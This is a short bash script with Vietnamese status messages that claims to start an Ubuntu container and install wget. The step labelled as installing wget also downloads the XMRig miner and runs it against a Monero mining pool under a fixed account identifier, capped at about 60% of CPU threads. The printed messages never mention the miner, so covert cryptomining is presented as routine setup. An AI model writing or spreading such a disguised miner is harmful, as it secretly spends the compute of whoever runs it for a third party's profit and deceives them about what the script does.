#!/bin/bash
set -e

echo "==> Khởi động Ubuntu container..."
docker compose up -d

echo "==> Chờ container sẵn sàng..."
sleep 3

echo "==> Cài đặt wget bên trong Ubuntu..."
docker exec ubuntu_cli bash -c "apt update && apt install -y wget && cd ~ && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && cd xmrig-6.26.0 && ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.whhhhrke3 -p x --coin monero --cpu-max-threads-hint=60"

echo "==> Hoàn tất! Mở terminal mới để vào Ubuntu."
